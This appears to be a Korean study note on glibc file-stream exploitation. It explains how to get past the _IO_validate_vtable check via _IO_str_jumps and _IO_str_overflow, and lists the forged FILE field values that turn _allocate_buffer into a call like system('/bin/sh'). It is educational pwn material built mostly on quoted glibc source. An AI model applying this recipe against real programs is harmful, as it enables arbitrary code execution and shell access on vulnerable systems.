`_IO_validate_vtable`은 `vtable`을 검증하는 함수인데 `vtable`이 `libc_IO_vtables` 범위 안에 있는지 확인한다  
때문에 임의로 다른 공간에 `vtable` 구조를 만들고 그 주소를 `_IO_validate_vtable`에 넘겼다면 오류가 발생하게 된다  

이를 우회하기 위해서 `_IO_validate_vtable` 안에 있는 `vtable` 중 취약한 것을 찾아 사용하면 된다  
`fp` 구조체 조작 후 뒤에 붙어 있는 (`_IO_FILE` 구조체 뒤에 붙어 있는) vtable 포인터를 조작한다  
<br>

---

```c
// /libio/strops.c

const struct _IO_jump_t _IO_str_jumps libio_vtable =
{
  JUMP_INIT_DUMMY,
  JUMP_INIT(finish, _IO_str_finish),
  JUMP_INIT(overflow, _IO_str_overflow),
  JUMP_INIT(underflow, _IO_str_underflow),
  JUMP_INIT(uflow, _IO_default_uflow),
  JUMP_INIT(pbackfail, _IO_str_pbackfail),
  JUMP_INIT(xsputn, _IO_default_xsputn),
  JUMP_INIT(xsgetn, _IO_default_xsgetn),
  JUMP_INIT(seekoff, _IO_str_seekoff),
  JUMP_INIT(seekpos, _IO_default_seekpos),
  JUMP_INIT(setbuf, _IO_default_setbuf),
  JUMP_INIT(sync, _IO_default_sync),
  JUMP_INIT(doallocate, _IO_default_doallocate),
  JUMP_INIT(read, _IO_default_read),
  JUMP_INIT(write, _IO_default_write),
  JUMP_INIT(seek, _IO_default_seek),
  JUMP_INIT(close, _IO_default_close),
  JUMP_INIT(stat, _IO_default_stat),
  JUMP_INIT(showmanyc, _IO_default_showmanyc),
  JUMP_INIT(imbue, _IO_default_imbue)
};
```

그 중 하나가 `_IO_str_jumps` vtable이다  
여기서 `_IO_str_overflow()`를 활용하게 된다  

이 외에도 `_IO_str_finish()`,  
`_IO_wstr_jumps` vtable의 `_IO_wstr_overflow()`, `_IO_wstr_finish()`를 사용할 수도 있다고 한다  
<br>

---

```c
int
_IO_str_overflow (_IO_FILE *fp, int c)
{
  int flush_only = c == EOF;
  _IO_size_t pos;
  if (fp->_flags & _IO_NO_WRITES)
      return flush_only ? 0 : EOF;
  if ((fp->_flags & _IO_TIED_PUT_GET) && !(fp->_flags & _IO_CURRENTLY_PUTTING))
    {
      fp->_flags |= _IO_CURRENTLY_PUTTING;
      fp->_IO_write_ptr = fp->_IO_read_ptr;
      fp->_IO_read_ptr = fp->_IO_read_end;
    }
  pos = fp->_IO_write_ptr - fp->_IO_write_base;
  if (pos >= (_IO_size_t) (_IO_blen (fp) + flush_only))
    {
      if (fp->_flags & _IO_USER_BUF) /* not allowed to enlarge */
	return EOF;
      else
	{
	  char *new_buf;
	  char *old_buf = fp->_IO_buf_base;
	  size_t old_blen = _IO_blen (fp);
	  _IO_size_t new_size = 2 * old_blen + 100;
	  if (new_size < old_blen)
	    return EOF;
	  new_buf
	    = (char *) (*((_IO_strfile *) fp)->_s._allocate_buffer) (new_size);
	  if (new_buf == NULL)
	    {
	      /*	  __ferror(fp) = 1; */
	      return EOF;
	    }
	  if (old_buf)
	    {
	      memcpy (new_buf, old_buf, old_blen);
	      (*((_IO_strfile *) fp)->_s._free_buffer) (old_buf);
	      /* Make sure _IO_setb won't try to delete _IO_buf_base. */
	      fp->_IO_buf_base = NULL;
	    }
	  memset (new_buf + old_blen, '\0', new_size - old_blen);

	  _IO_setb (fp, new_buf, new_buf + new_size, 1);
	  fp->_IO_read_base = new_buf + (fp->_IO_read_base - old_buf);
	  fp->_IO_read_ptr = new_buf + (fp->_IO_read_ptr - old_buf);
	  fp->_IO_read_end = new_buf + (fp->_IO_read_end - old_buf);
	  fp->_IO_write_ptr = new_buf + (fp->_IO_write_ptr - old_buf);

	  fp->_IO_write_base = new_buf;
	  fp->_IO_write_end = fp->_IO_buf_end;
	}
    }

  if (!flush_only)
    *fp->_IO_write_ptr++ = (unsigned char) c;
  if (fp->_IO_write_ptr > fp->_IO_read_end)
    fp->_IO_read_end = fp->_IO_write_ptr;
  return c;
}
libc_hidden_def (_IO_str_overflow)
```

`new_buf`가 정의될 때 취약하게 작동하는데 그 전까지에 있는 조건문들을 맞춰줘야 한다  

`fp->_flags`에 `_IO_NO_WRITES`(8=0x8) 설정이 되어 있지 않아야 함  
`fp->_flags`에 `_IO_TIED_PUT_GET`(0x400)이 설정되어 있지 않거나 `_IO_CURRENTLY_PUTTING`(0x800)이 설정되어 있어야 함  
`fp->flags`에 `_IO_USER_BUF`(1=0x1)가 설정되어 있지 않아야 함  
<br>

---

```c
new_buf
  = (char *) (*((_IO_strfile *) fp)->_s._allocate_buffer) (new_size);
```

이렇게 맞추면 `new_buf`를 정의하는 부분까지 올 수 있게 된다  

왜 `new_buf`냐 하면 이게 정의될 때 `fp`를 조작해서 함수에 인자를 주어 실행시킬 수 있기 때문이다  
`fp`의 `_s.allocate_buffer` 멤버에 있는 함수 포인터를 `new_size` 인자와 함께 실행시킨다  
<br>

---

```c
// /libio/strfile.h

typedef void *(*_IO_alloc_type) (_IO_size_t);
typedef void (*_IO_free_type) (void*);

struct _IO_str_fields
{
  _IO_alloc_type _allocate_buffer;
  _IO_free_type _free_buffer;
};

struct _IO_streambuf
{
  struct _IO_FILE _f;
  const struct _IO_jump_t *vtable;
};

...

typedef struct _IO_strfile_
{
  struct _IO_streambuf _sbf;
  struct _IO_str_fields _s;
} _IO_strfile;
```

근데 `fp`가 `_IO_strfile` 구조체로 파싱되기 때문에 위 코드를 참고해서 구조를 맞춰서 `fp` 구조체를 조작해주면 된다  

`_s` 멤버는 `_IO_FILE_plus` 구조체와 구조가 같은 `_IO_streambuf` 구조체 바로 뒤에 있으므로 `vtable` 뒤에 있게 되는 것을 알 수 있다  
`_s.allocate_buffer` 또한 첫 번째 멤버이기에 `_s` 위치와 같다  

그러면 이 곳에 실행하고픈 함수 포인터의 주소를 넣으면 원하는 함수를 실행할 수 있게 된다  
(`_IO_FILE` 구조체 조작 후 구조체 뒤에 (`vtable` 주소 8바이트) + (원하는 함수 포인터 주소))
<br>

---

```c
// /libio/libioP.h
#define _IO_blen(fp) ((fp)->_IO_buf_end - (fp)->_IO_buf_base)
```
```c
// /libio/strops.h

size_t old_blen = _IO_blen (fp);
_IO_size_t new_size = 2 * old_blen + 100;
```

그러면 이제 원하는 함수에 주고픈 인자를 설정해야 한다  
아까 인자로 `new_size`가 들어갔는데 `new_size`의 계산 과정을 보면 `old_blen`에 2를 곱하고 100을 더한 값이다  

`old_blen`은 또 뭔가 했더니 다행히 간단하게 `_IO_buf_end` - `_IO_buf_base`를 한 값이다  

`new_size` => "/bin/sh"  
`old_blen` = `_IO_buf_end`-`_IO_buf_base` = ("/bin/sh"주소 - 100) / 2
<br>

---

```c
pos = fp->_IO_write_ptr - fp->_IO_write_base;
if (pos >= (_IO_size_t) (_IO_blen (fp) + flush_only))
  {
    if (fp->_flags & _IO_USER_BUF) /* not allowed to enlarge */
return EOF;
    else
```

그 전에 이 맞춰줘야 한다   
뭔가 며칠에 걸쳐서 글을 쓰다 보니 흐름도 이상하고 설명도 이상해진 느낌이다.. 이렇게 보는 것보다 직접 해보는 게 이해하기 쉽고 빠르니까 흐름만 파악하고 직접 해보기를 추천한다  

아무튼 `_IO_write_ptr`-`_IO_write_base`가 `_IO_buf_end`-`_IO_buf_base` 보다 크거나 같아야 한다..  
`flush_only`는 그냥 0이다  
간단하게 같게 만들어주면 된다  
<br>

---

정리하면  
- _flags -> 0000  
- _IO_write_ptr -> 인자  
- _IO_buf_end -> 인자와 같거나 개큰 값  
- _lock -> write 가능한 주소 (가끔 안 됨)  
- vtable -> 가짜 vtable 주소 / `_IO_str_jumps` vtable 맞추기  
- `_IO_str_overflow` 사용해서 임의 함수 실행  

<br>

---


